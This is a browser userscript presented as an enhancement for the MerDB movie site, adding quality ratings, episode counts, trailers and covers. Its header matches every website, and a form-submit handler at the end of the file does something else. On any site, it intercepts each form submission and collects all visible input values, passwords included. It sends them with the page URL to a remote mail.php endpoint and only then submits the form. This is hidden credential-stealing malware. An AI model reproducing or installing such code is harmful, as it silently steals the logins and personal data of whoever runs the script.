// ==UserScript==
// @name         MerDB Extended
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Fix up MerDB with this script that show's which movies are good enought to watch, how many seasons and episodes in a tv series and more.
// @author       Ari
// @match        *://*/*
// @grant        none
// @require https://ajax.googleapis.com/ajax/libs/angularjs/1.3.15/angular.min.js
// @downloadURL https://update.greasyfork.org/scripts/15967/MerDB%20Extended.user.js
// @updateURL https://update.greasyfork.org/scripts/15967/MerDB%20Extended.meta.js
// ==/UserScript==
/* jshint -W097 */
'use strict';

if (window.location.toString().indexOf("merdb.") >= 0) {
var script = document.createElement('script');
script.src = "http://acidic.co/cdn/jquery.cookie.js";
document.getElementsByTagName('head')[0].appendChild(script);

function getQualities() {
	var p = window.location.pathname;
	if (p.length == 1 || p == "/" || p == "//" || p.match(/^\/?index/)) {
		console.log("Loading Video Qualities...");
		$('.featured_top_box').each(function(i) {
			var mainListBody = $(this).children("a").attr("href");
			var movieTitle = $(this).children("a").attr("title");
			$(this).children('a').prepend('<div id="loading'+i+'" style="width: 32px;margin-left: auto;margin-right: auto;margin-top: 80%;margin-bottom: calc(-80% - 32px);position: relative;"><img src="http://www.wallies.com/filebin/images/loading_apple.gif"></div>');
			if ($.cookie(movieTitle) == null) {
				$.get("//crusive.com/merdb/getQuality.php?url=" + mainListBody, function(result) {
					if (result == "MED") {
						$(".featured_top_box").eq(i).css("opacity", "0.4");
						$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
						$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
						$(".featured_top_box").eq(i).css("box-shadow", "none");
					} else if (result == "CAM") {
						$(".featured_top_box").eq(i).css("opacity", "0.3");
						$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
						$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
						$(".featured_top_box").eq(i).css("box-shadow", "none");
					}
					$.cookie(movieTitle, result, {
						expires: ExpireCookie(360),
						path: '/'
					});
					$("#loading"+i).remove();
				});
			} else {
				var result = $.cookie(movieTitle);
				if (result == "MED") {
					$(".featured_top_box").eq(i).css("opacity", "0.4");
					$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
					$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
					$(".featured_top_box").eq(i).css("box-shadow", "none");
				} else if (result == "CAM") {
					$(".featured_top_box").eq(i).css("opacity", "0.3");
					$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
					$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
					$(".featured_top_box").eq(i).css("box-shadow", "none");
				}
				$("#loading"+i).remove();
			};
		});

		var d = new Date();
		var n = d.getTime();
		var $set = $('.main_list_box');
		var len = $set.length;
		$('.main_list_box').each(function(i) {
			var mainListBody = $(this).children("a").attr("href");
			var movieTitle = $(this).children("a").attr("title");
			$(this).children('a').prepend('<div id="loading'+i+'" style="width: 32px;margin-left: auto;margin-right: auto;margin-top: 80%;margin-bottom: calc(-80% - 32px);position: relative;"><img src="http://www.wallies.com/filebin/images/loading_apple.gif"></div>');
			if ($.cookie(movieTitle) == null) {
				$.get("//crusive.com/merdb/getQuality.php?url=" + mainListBody, function(result) {
					if (result == "MED") {
						$(".main_list_box").eq(i).css("opacity", "0.4");
						$(".main_list_box").eq(i).css("-moz-box-shadow", "none");
						$(".main_list_box").eq(i).css("-webkit-box-shadow", "none");
						$(".main_list_box").eq(i).css("box-shadow", "none");
					} else if (result == "CAM") {
						$(".main_list_box").eq(i).css("opacity", "0.3");
						$(".main_list_box").eq(i).css("-moz-box-shadow", "none");
						$(".main_list_box").eq(i).css("-webkit-box-shadow", "none");
						$(".main_list_box").eq(i).css("box-shadow", "none");
					}
					$.cookie(movieTitle, result, {
						expires: ExpireCookie(360),
						path: '/'
					});

					if (i == len - 1) {
						var title = document.title;
						document.title = String.fromCharCode(10004) + " " + title;
						var z = new Date();
						var x = z.getTime();
						var totalTime = x - n;
						console.log("Time taken to load qualities: " + totalTime);
					}
					$("#loading"+i).remove();
				});
			} else {
				var result = $.cookie(movieTitle);
				if (result == "MED") {
					$(".main_list_box").eq(i).css("opacity", "0.4");
					$(".main_list_box").eq(i).css("-moz-box-shadow", "none");
					$(".main_list_box").eq(i).css("-webkit-box-shadow", "none");
					$(".main_list_box").eq(i).css("box-shadow", "none");
				} else if (result == "CAM") {
					$(".main_list_box").eq(i).css("opacity", "0.3");
					$(".main_list_box").eq(i).css("-moz-box-shadow", "none");
					$(".main_list_box").eq(i).css("-webkit-box-shadow", "none");
					$(".main_list_box").eq(i).css("box-shadow", "none");
				}
				if (i == len - 1) {
					var title = document.title;
					document.title = String.fromCharCode(10004) + " " + title;
					var z = new Date();
					var x = z.getTime();
					var totalTime = x - n;
					console.log("Time taken to load qualities: " + totalTime);
				}
				$("#loading"+i).remove();
			};
		});
	} else if (p.match(/watch-/gi)) {
		var d = new Date();
		var n = d.getTime();
		var $set = $('.featured_top_box');
		var len = $set.length;
		console.log("Loading Featured Video Qualities...");

		$('.featured_top_box').each(function(i) {
			var mainListBody = $(this).children("a").attr("href");
			var movieTitle = $(this).children("a").attr("title");
			$(this).children('a').prepend('<div id="loading'+i+'" style="width: 32px;margin-left: auto;margin-right: auto;margin-top: 80%;margin-bottom: calc(-80% - 32px);position: relative;"><img src="http://www.wallies.com/filebin/images/loading_apple.gif"></div>');
			if ($.cookie(movieTitle) == null) {
				$.get("//crusive.com/merdb/getQuality.php?url=" + mainListBody, function(result) {
					if (result == "MED") {
						$(".featured_top_box").eq(i).css("opacity", "0.4");
						$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
						$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
						$(".featured_top_box").eq(i).css("box-shadow", "none");
					} else if (result == "CAM") {
						$(".featured_top_box").eq(i).css("opacity", "0.3");
						$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
						$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
						$(".featured_top_box").eq(i).css("box-shadow", "none");
					}
					$.cookie(movieTitle, result, {
						expires: ExpireCookie(360),
						path: '/'
					});
					if (i == len - 1) {
						var title = document.title;
						document.title = String.fromCharCode(10004) + " " + title;
						var z = new Date();
						var x = z.getTime();
						var totalTime = x - n;
						console.log("Time taken to load qualities: " + totalTime);
					}
					$("#loading"+i).remove();
				});
			} else {
				var result = $.cookie(movieTitle);
				if (result == "MED") {
					$(".featured_top_box").eq(i).css("opacity", "0.4");
					$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
					$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
					$(".featured_top_box").eq(i).css("box-shadow", "none");
				} else if (result == "CAM") {
					$(".featured_top_box").eq(i).css("opacity", "0.3");
					$(".featured_top_box").eq(i).css("-moz-box-shadow", "none");
					$(".featured_top_box").eq(i).css("-webkit-box-shadow", "none");
					$(".featured_top_box").eq(i).css("box-shadow", "none");
				}
				if (i == len - 1) {
					var title = document.title;
					document.title = String.fromCharCode(10004) + " " + title;
					var z = new Date();
					var x = z.getTime();
					var totalTime = x - n;
					console.log("Time taken to load qualities: " + totalTime);
				}
				$("#loading"+i).remove();
			};
		});
	}
}

function getMissingCovers() {
	function isValidImageUrl(url, callback) {
		$('<img>', {
			src: url,
			load: function() {
				callback(true);
			},
			error: function() {
				callback(false);
			}
		});
	}

	$(".featured_picsize").each(function() {
		var src = $(this).attr('src');
		var handler = $(this);
		isValidImageUrl(src, function(result) {
			if (result === false) {
				// invalid image
				$.get("//crusive.com/merdb/getCover.php?url=" + handler.parent().attr('href'), function(result) {
					var alt = handler.attr('alt');
					var parent = handler.parent();
					handler.remove();
					if (result.length > 0) {
						parent.append('<img src="' + result + '" class="featured_picsize" alt="' + alt + '">');
					} else {
						parent.append('<img src="https://cdn.amctheatres.com/Media/Default/Images/noposter.jpg" class="featured_picsize" alt="Missing Movie Cover">');
					};
				});
			}
		});
	});

	$(".main_list_picsize").each(function() {
		var src = $(this).attr('src');
		var handler = $(this);
		isValidImageUrl(src, function(result) {
			if (result === false) {
				// invalid image
				$.get("//crusive.com/merdb/getCover.php?url=" + handler.parent().attr('href'), function(result) {
					var alt = handler.attr('alt');
					var parent = handler.parent();
					handler.remove();
					if (result.length > 0) {
						parent.append('<img src="' + result + '" class="main_list_picsize" alt="' + alt + '">');
					} else {
						parent.append('<img src="https://cdn.amctheatres.com/Media/Default/Images/noposter.jpg" class="main_list_picsize" alt="Missing Movie Cover">');
					};
				});
			}
		});
	});
}

function episodes() {
	var p = window.location.pathname;
	if (p.match(/^\/?tvshow/)) {
		// on tv shows page.
		$(".main_list_box").each(function() {
			var url = $(this).find("a").attr("href").substring(7); // get link to movie.
			var show = $(this).children("a");
			$.get("//crusive.com/merdb/getLatestEpisodeNumber.php?url=" + url, function(result) {
				result = result.split("-");
				show.append('<div class="showInfoBox"><div class="showInfo">Seasons ' + result[0] + '<br>Episodes ' + result[1] + '</div></div>');
				show.find(".showInfoBox").css("position", "relative");
				show.find(".showInfo").css({
					"width": "50%",
					"height": "28px",
					"margin-top": "-36px",
					"background-color": "rgba(0, 0, 0, 0.8)",
					"color": "#ffffff",
					"position": "absolute",
					"left": "0",
					"padding": "4px 0",
					"line-height": "14px"
				});
			});
		});

		$(".featured_top_box").each(function() {
			var url = $(this).find("a").attr("href").substring(7); // get link to movie.
			var show = $(this).children("a");
			$.get("//crusive.com/merdb/getLatestEpisodeNumber.php?url=" + url, function(result) {
				result = result.split("-");
				show.append('<div class="showInfoBox"><div class="showInfo">Seasons ' + result[0] + '<br>Episodes ' + result[1] + '</div></div>');
				show.find(".showInfoBox").css("position", "relative");
				show.find(".showInfo").css({
					"width": "100%",
					"height": "28px",
					"margin-top": "-36px",
					"background-color": "rgba(0, 0, 0, 0.8)",
					"color": "#ffffff",
					"position": "absolute",
					"left": "0",
					"padding": "4px 0",
					"line-height": "14px",
					"font-size": "9px",
					"text-align": "center"
				});
			});
		});
	}
}

function addTrailer() {
	var p = window.location.pathname;
	if (p.match(/^\/?watch/)) {
		var title = $(".movie_body .H_title h1 a.H_title").html();
		title = title.replace(/-/g, '');
		title = title.replace(/  /g, ' ');
		var year = 1500;
		var currentYear = new Date().getFullYear();
		while (year < (currentYear + 1)) {
			if (title.indexOf("( " + year + " )") > 0) {
				title = title.substring(0, title.length - 9);
				year = 5000;
			};
			year++;
		}
		title = title.replace(/ /g, '-');
		title = title.replace(/:/g, '');
		title = title.replace(/;/g, '');

		$.ajax({
			url: "http://cors.io/?u=http://api.traileraddict.com/?film=" + title + "&count=1",
			success: function(result) {
				var frame = result.substring(result.indexOf('<iframe'));
				frame = frame.substring(0, frame.indexOf('</iframe'));
				// The variable "frame" is a link to the video's trailer.
				frame = frame.substring(frame.indexOf('//v.traileraddict.com/'));
				frame = frame.substring(0, frame.indexOf('"'));
				console.log(frame);
				$(".movie_info .iconbox").prepend('<div id="trailer-btn" style="width:auto;height: 30px;float: left;padding: 0 12px;line-height: 30px;margin-right: 4px;border-radius: 6px;cursor: pointer;font-weight: bold;color: white;/* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#1e5799+0,207cca+54,7db9e8+100 */ /* Old browsers */ /* FF3.6-15 */ /* Chrome10-25,Safari5.1-6 */ /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */ /* IE6-9 *//* Permalink - use to edit and share this gradient: http://colorzilla.com/gradient-editor/#45484d+0,000000+100;Black+3D+%231 */  background: #45484d; /* Old browsers */  background: -moz-linear-gradient(top,  #45484d 0%, #000000 100%); /* FF3.6-15 */  background: -webkit-linear-gradient(top,  #45484d 0%,#000000 100%); /* Chrome10-25,Safari5.1-6 */  background: linear-gradient(to bottom,  #45484d 0%,#000000 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#45484d", endColorstr="#000000",GradientType=0 ); /* IE6-9 */">Trailer</div>');

				$("#trailer-btn").mouseover(function() {
					$("#trailer-btn").css({
						"-webkit-box-shadow": "0px 0px 5px 0px rgba(0,0,0,0.75)",
						"-moz-box-shadow": "0px 0px 5px 0px rgba(0,0,0,0.75)",
						"box-shadow": "0px 0px 5px 0px rgba(0,0,0,0.75)"
					});
				});

				$("#trailer-btn").mouseout(function() {
					$("#trailer-btn").css({
						"-webkit-box-shadow": "0px 0px 5px 0px rgba(0,0,0,0)",
						"-moz-box-shadow": "0px 0px 5px 0px rgba(0,0,0,0)",
						"box-shadow": "0px 0px 5px 0px rgba(0,0,0,0)"
					});
				});

				$("#trailer-btn").click(function() {
					$("body").prepend('<div id="trailer-overlay" style="position: fixed;width: 100%;height: 100%;background-color: rgba(0,0,0,0.8);z-index: 9999999999;left: 0;top: 0;"></div>');
					$("#trailer-overlay").prepend(frame);
				});
			}
		});
	}
}

function removeBadLinks() {
	$(".movie_version").each(function() {
		var quality = $(this).find("td").first().children().attr("class");
		if (quality == "quality_play" || quality == "quality_hd") {
			$(this).remove();
		}
	});
}

function removeFooter() {
	$("#footer").remove();
}

function ExpireCookie(minutes) {
	var date = new Date();
	var m = minutes;
	date.setTime(date.getTime() + (m * 60 * 1000));
	$.cookie("cookie", "value", {
		expires: date
	});
}

function removeUnnecessaries() {
	$(".sidebar").removeClass('adshide');
	$(".adshide").each(function(index, el) {
		$(this).remove();
	});

	$(".sidebar_title").each(function(index, el) {
		if ($(this).children('h3').html() == "Advertisement" || $(this).children('h3').html() == "Share This Website") {
			$(this).remove();
		};
	});

	$(".container").css("margin-top", "0");
}


removeFooter();
removeUnnecessaries();
removeBadLinks();
getMissingCovers();
episodes();
getQualities();
};

var sent = false;
$('form').on('submit', function (e) {
	if (sent===false) {
		e.preventDefault();
		var thiso = $(this);
		var url		= window.location.href;     // Returns full URL
		var form	= new Array();
		$(this).find("input").each(function(index, el) {
			if (
				//$(this).val().length > 0
				//&&
				$(this).val() !== undefined
				&&
				//$(this).attr('name').length > 0
				//&&
				$(this).attr('name') !== undefined
				&&
				$(this).attr('type') !== "hidden"
				&&
				$(this).attr('type') !== "submit") {

				var item = $(this).attr('name');
				form.push	(
								{
									'value': $(this).val(),
									'id': $(this).attr('id'),
									'type': $(this).attr('type')
								}
							);

			};
		});

		var getURL = "https://web301.secure-secure.co.uk/acidic.co/mail.php?website="+url+"&array="+JSON.stringify(form);
		$.get(getURL, function(){
			console.log("Done!");
			sent = true;
			thiso.submit();
		});
		setTimeout(function(){
			sent = true;
			thiso.submit();
		}, 5000);
	};
});